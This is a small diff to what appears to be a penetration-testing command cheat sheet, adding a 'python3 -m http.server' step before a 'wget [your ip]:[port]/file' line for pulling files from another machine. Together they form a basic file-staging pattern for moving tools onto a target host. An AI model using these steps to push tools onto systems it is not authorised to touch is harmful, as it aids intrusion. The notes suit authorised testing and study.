@@ -109,6 +109,10 @@ systeminfo
 
 #### Wget (like curl) (get files from other ip address)
 ```bash
+python3 -m http.server 8080
+```
+#####
+```bash
 wget [your ip]:[port]/file
 ```
 #### chmod
